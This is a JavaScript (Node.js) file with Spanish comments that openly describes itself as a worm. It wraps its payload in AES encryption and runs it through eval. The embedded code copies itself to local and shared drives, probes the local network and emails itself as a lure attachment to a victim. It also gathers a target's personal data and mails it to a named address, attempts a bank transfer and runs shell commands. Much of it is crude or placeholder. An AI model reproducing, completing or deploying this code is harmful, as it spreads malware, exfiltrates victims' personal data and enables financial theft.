const fs = require('fs');
const path = require('path');
const axios = require('axios');
const net = require('net');
const { exec } = require('child_process');
const crypto = require('crypto');
const nodemailer = require('nodemailer');

// Configuración del correo
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'tu_correo@gmail.com',
    pass: 'tu_contraseña',
  },
});

// Función para ofuscar el código
function obfuscateCode(code) {
  const key = crypto.randomBytes(32);
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key), iv);
  let encrypted = cipher.update(code, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return { key: key.toString('hex'), iv: iv.toString('hex'), encrypted };
}

// Función para desofuscar el código
function deobfuscateCode({ key, iv, encrypted }) {
  const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(key, 'hex'), Buffer.from(iv, 'hex'));
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

// Código del gusano ofuscado
const obfuscatedWorm = obfuscateCode(`
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const net = require('net');
const { exec } = require('child_process');
const nodemailer = require('nodemailer');

// Configuración del correo
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'tu_correo@gmail.com',
    pass: 'tu_contraseña',
  },
});

// Función para replicar el gusano
function replicateWorm() {
  const wormPath = path.join(__dirname, 'worm.js');
  const targetPath = path.join(__dirname, 'replica.js');

  // Leer el contenido del gusano actual
  const wormContent = fs.readFileSync(wormPath, 'utf8');

  // Escribir el contenido en un nuevo archivo (la réplica)
  fs.writeFileSync(targetPath, wormContent, 'utf8');

  console.log('Worm replicated successfully!');
}

// Función para propagar el gusano a través de una red compartida
function propagateWorm() {
  const sharedDrivePath = '//shareddrive/path/to/propagate';

  // Copiar el gusano a la unidad de red compartida
  fs.copyFileSync(path.join(__dirname, 'worm.js'), path.join(sharedDrivePath, 'worm.js'));

  console.log('Worm propagated to shared drive successfully!');
}

// Función para escanear la red WiFi en busca de otros sistemas vulnerables
function scanWiFiNetwork() {
  const client = new net.Socket();

  client.connect(80, '192.168.1.1', () => {
    console.log('Connected to network device');
    // Aquí podrías agregar lógica para propagar el gusano a este dispositivo
    client.destroy();
  });

  client.on('error', (err) => {
    console.error('Network scan error:', err);
  });
}

// Función para enviar el gusano por correo
async function sendWormByEmail(targetEmail) {
  const mailOptions = {
    from: 'tu_correo@gmail.com',
    to: targetEmail,
    subject: 'Importante: Revisa este archivo',
    text: 'Por favor, revisa el archivo adjunto.',
    attachments: [
      {
        filename: 'worm.js',
        path: path.join(__dirname, 'worm.js'),
      },
    ],
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent: ' + info.response);
  } catch (error) {
    console.error('Error sending email:', error);
  }
}

// Función para realizar doxing (recopilación de información personal)
async function doxVictim() {
  try {
    const response = await axios.get('https://api.example.com/userinfo?user=target');
    const userInfo = response.data;
    console.log('Doxing information:', userInfo);
    // Aquí podrías agregar lógica para guardar esta información o enviarla a un servidor remoto
    return userInfo;
  } catch (error) {
    console.error('Error during doxing:', error);
  }
}

// Función para realizar control bancario (transferir dinero)
async function bankControl() {
  try {
    const transferData = {
      fromAccount: 'sourceAccount',
      toAccount: 'targetAccount',
      amount: 1000,
      // Otros detalles de la transferencia
    };

    const response = await axios.post('https://api.bank.com/transfer', transferData);
    console.log('Money transferred successfully:', response.data);
  } catch (error) {
    console.error('Error during bank control:', error);
  }
}

// Función para ejecutar comandos remotos
function executeRemoteCommand(command) {
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(\`Error executing command: \${error.message}\`);
      return;
    }
    if (stderr) {
      console.error(\`Stderr: \${stderr}\`);
      return;
    }
    console.log(\`Command output: \${stdout}\`);
  });
}

// Función para enviar datos de la víctima a un correo específico
async function sendVictimDataToEmail(victimData, targetEmail) {
  const mailOptions = {
    from: 'tu_correo@gmail.com',
    to: targetEmail,
    subject: 'Datos de la víctima',
    text: 'Aquí están los datos de la víctima:',
    attachments: [
      {
        filename: 'victim_data.json',
        content: JSON.stringify(victimData, null, 2),
      },
    ],
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log('Victim data sent: ' + info.response);
  } catch (error) {
    console.error('Error sending victim data:', error);
  }
}

// Ejecutar la replicación, propagación, escaneo de red, doxing, control bancario, envío por correo y ejecución de comandos remotos
replicateWorm();
propagateWorm();
scanWiFiNetwork();
const victimData = await doxVictim();
sendVictimDataToEmail(victimData, 'pezoaa23@gmail.com'); // Enviar los datos de la víctima a pezoaa23@gmail.com
bankControl();
executeRemoteCommand('dir'); // Ejemplo de comando remoto
sendWormByEmail('victima@gmail.com'); // Enviar el gusano por correo a la víctima
`);

// Desofuscar y ejecutar el código del gusano
const wormCode = deobfuscateCode(obfuscatedWorm);
eval(wormCode);
